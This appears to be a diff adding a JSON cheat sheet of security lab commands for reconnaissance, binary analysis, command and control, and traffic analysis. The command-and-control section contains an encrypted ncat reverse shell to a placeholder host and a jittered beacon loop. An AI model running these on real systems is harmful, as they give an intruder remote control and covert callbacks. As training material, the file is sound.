@@ -1,0 +1,244 @@
+{
+  "categories": [
+    {
+      "name": "Reconnaissance",
+      "tools": [
+        {
+          "name": "Nmap",
+          "description": "Network Mapper for discovery and security auditing. (Source: Recon Lab)",
+          "commands": [
+            {
+              "title": "Stealth SYN Scan",
+              "syntax": "nmap -sS -p {target_port} {target_ip}",
+              "flags": {
+                "-sS": "TCP SYN scan (default, stealthy).",
+                "-p": "Only scan specified ports."
+              }
+            },
+            {
+              "title": "Aggressive All-Port Scan",
+              "syntax": "nmap -p- -A -T4 {target_ip}",
+              "flags": {
+                "-p-": "Scan all 65535 ports.",
+                "-A": "Enable OS detection, version detection, script scanning, and traceroute.",
+                "-T4": "Aggressive timing template for faster execution."
+              }
+            }
+          ]
+        },
+        {
+          "name": "Gobuster",
+          "description": "Directory/File, DNS and VHost busting tool written in Go.",
+          "commands": [
+            {
+              "title": "Directory Brute Force",
+              "syntax": "gobuster dir -u http://{target_ip}:{target_port} -w {wordlist} -t 50",
+              "flags": {
+                "dir": "Uses directory/file enumeration mode.",
+                "-u": "The target URL.",
+                "-w": "Path to the wordlist.",
+                "-t": "Concurrent threads."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Weaponization & Environment",
+      "tools": [
+        {
+          "name": "Inotifywait",
+          "description": "Defender watch tool to monitor file system access. (Source: Weaponization Lab)",
+          "commands": [
+            {
+              "title": "Monitor File Access",
+              "syntax": "inotifywait -m /etc/passwd",
+              "flags": {
+                "-m": "Monitor continually."
+              }
+            }
+          ]
+        },
+        {
+          "name": "Chkrootkit",
+          "description": "Environment baseline rooting scanner. (Source: Exploitation Lab)",
+          "commands": [
+            {
+              "title": "Rootkit Baseline Scan",
+              "syntax": "sudo chkrootkit",
+              "flags": {}
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Exploitation & Binary Analysis",
+      "tools": [
+        {
+          "name": "Radare2",
+          "description": "Interactive disassembly & decompilation framework. (Source: Exploitation Lab)",
+          "commands": [
+            {
+              "title": "Start Static Analysis",
+              "syntax": "r2 -A ./test-program",
+              "flags": {
+                "-A": "Run 'aaa' command to analyze all referenced code."
+              }
+            }
+          ]
+        },
+        {
+          "name": "Readelf",
+          "description": "Displays information about ELF files. (Source: Exploitation Lab)",
+          "commands": [
+            {
+              "title": "Extract ELF Metadata",
+              "syntax": "readelf -h -S -s ./test-program",
+              "flags": {
+                "-h": "Display the ELF file header.",
+                "-S": "Display the sections' header.",
+                "-s": "Display the symbol table."
+              }
+            }
+          ]
+        },
+        {
+          "name": "Syscall / Library Trace",
+          "description": "strace/ltrace to monitor system and library calls during dynamic analysis.",
+          "commands": [
+            {
+              "title": "Trace System Calls",
+              "syntax": "strace -o strace.log ./test-program",
+              "flags": {
+                "-o": "Output to file."
+              }
+            },
+            {
+              "title": "Trace Library Calls",
+              "syntax": "ltrace -o ltrace.log ./test-program",
+              "flags": {}
+            }
+          ]
+        },
+        {
+          "name": "GDB (GNU Debugger)",
+          "description": "Step through execution to observe branch conditions. (Source: Exploitation Lab)",
+          "commands": [
+            {
+              "title": "Start Debugger",
+              "syntax": "gdb -q ./test-program",
+              "flags": {
+                "-q": "Quiet mode, do not print introductory messages."
+              }
+            }
+          ]
+        },
+        {
+          "name": "LSOF",
+          "description": "List open files and descriptors. (Source: Exploitation Lab)",
+          "commands": [
+            {
+              "title": "Inspect Open Descriptors by PID",
+              "syntax": "lsof -p <PID>",
+              "flags": {
+                "-p": "Select by PID."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Command & Control (C2)",
+      "tools": [
+        {
+          "name": "Ncat (Encrypted)",
+          "description": "Creating encrypted reverse shells & beacons. (Source: C2 Lab)",
+          "commands": [
+            {
+              "title": "C2 Listener (Controller)",
+              "syntax": "ncat -lv 9001 --ssl",
+              "flags": {
+                "-l": "Listen for connections.",
+                "-v": "Verbose.",
+                "--ssl": "Encrypt connection using TLS."
+              }
+            },
+            {
+              "title": "Encrypted Reverse Shell (Target)",
+              "syntax": "ncat {local_ip} 9001 --ssl -e /bin/bash",
+              "flags": {
+                "--ssl": "Encrypt connection using TLS.",
+                "-e": "Execute program after connect."
+              }
+            },
+            {
+              "title": "Periodic Encrypted Beacon with Jitter",
+              "syntax": "while true; do echo \"alive $(date)\" | ncat {local_ip} 9002 --ssl; sleep $((45 + RANDOM % 30)); done",
+              "flags": {}
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Defender Toolkit & Traffic Analysis",
+      "tools": [
+        {
+          "name": "Tcpdump",
+          "description": "Command-line packet analyzer. (Source: Defender Toolkit Lab)",
+          "commands": [
+            {
+              "title": "Capture Interface Traffic",
+              "syntax": "sudo tcpdump -i eth0 port 9001",
+              "flags": {
+                "-i": "Specify interface."
+              }
+            },
+            {
+              "title": "Write PCAP to File",
+              "syntax": "sudo tcpdump -i {interface} -w day_capture.pcap",
+              "flags": {
+                "-w": "Write raw packets to file."
+              }
+            }
+          ]
+        },
+        {
+          "name": "Tshark",
+          "description": "Terminal-based Wireshark for pcap pipeline analysis. (Source: Defender Toolkit Lab)",
+          "commands": [
+            {
+              "title": "Extract Destination IPs",
+              "syntax": "tshark -r day_capture.pcap -T fields -e ip.dst 2>/dev/null | sort | uniq -c | sort -nr > dst_ip_counts.txt",
+              "flags": {
+                "-r": "Read pcap file.",
+                "-T fields -e": "Extract specific fields."
+              }
+            },
+            {
+              "title": "Count Protocols",
+              "syntax": "tshark -r day_capture.pcap -T fields -e _ws.col.Protocol 2>/dev/null | sort | uniq -c | sort -nr > protocol_counts.txt",
+              "flags": {}
+            }
+          ]
+        },
+        {
+          "name": "Dig",
+          "description": "DNS lookup utility for destination resolution. (Source: Defender Toolkit Lab)",
+          "commands": [
+            {
+              "title": "Reverse DNS Lookup",
+              "syntax": "dig -x {target_ip}",
+              "flags": {
+                "-x": "Reverse lookup."
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
